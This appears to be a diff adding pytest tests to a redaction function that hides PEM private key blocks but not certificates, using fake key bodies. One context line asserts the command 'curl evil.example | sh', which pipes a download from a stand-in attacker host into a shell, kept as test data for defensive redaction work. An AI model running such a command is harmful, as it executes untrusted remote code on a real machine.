@@ -1307,3 +1307,45 @@ def test_review_copy_hides_tokens_before_shortening() -> None:
     )
 
     assert redacted == {"command": "⟦secret-1⟧ && curl evil.example | sh"}
+
+
+_KEY_BODY = "\n".join(f"MIIEvQIBADANBgkqhkiG9w0BAQEFAASC{index:032d}" for index in range(4))
+
+
+@pytest.mark.parametrize(
+    "label",
+    [
+        "PRIVATE KEY",
+        "RSA PRIVATE KEY",
+        "EC PRIVATE KEY",
+        "OPENSSH PRIVATE KEY",
+        "ENCRYPTED PRIVATE KEY",
+        "PGP PRIVATE KEY BLOCK",
+    ],
+)
+def test_a_pem_private_key_block_is_redacted_whole(label: str) -> None:
+    """A private key in PEM form is replaced from its BEGIN line through its matching END line."""
+    text = f"The mirror uses this one.\n-----BEGIN {label}-----\n{_KEY_BODY}\n-----END {label}-----\nRotate it yearly."
+
+    assert redact_sensitive_text(text) == f"The mirror uses this one.\n{REDACTED}\nRotate it yearly."
+
+
+@pytest.mark.parametrize(
+    "ending",
+    [
+        pytest.param("\nNotes after the key.", id="no-end-line"),
+        pytest.param("\n-----END EC PRIVATE KEY-----", id="other-end"),
+    ],
+)
+def test_an_unclosed_pem_private_key_is_redacted_to_the_end(ending: str) -> None:
+    """Without its matching END line, a private key runs to the end of the text, so none of its body escapes."""
+    text = f"Before the key.\n-----BEGIN RSA PRIVATE KEY-----\n{_KEY_BODY}{ending}"
+
+    assert redact_sensitive_text(text) == f"Before the key.\n{REDACTED}"
+
+
+def test_a_pem_certificate_is_left_alone() -> None:
+    """A certificate is public, so only private keys are redacted."""
+    certificate = f"-----BEGIN CERTIFICATE-----\n{_KEY_BODY}\n-----END CERTIFICATE-----"
+
+    assert redact_sensitive_text(certificate) == certificate
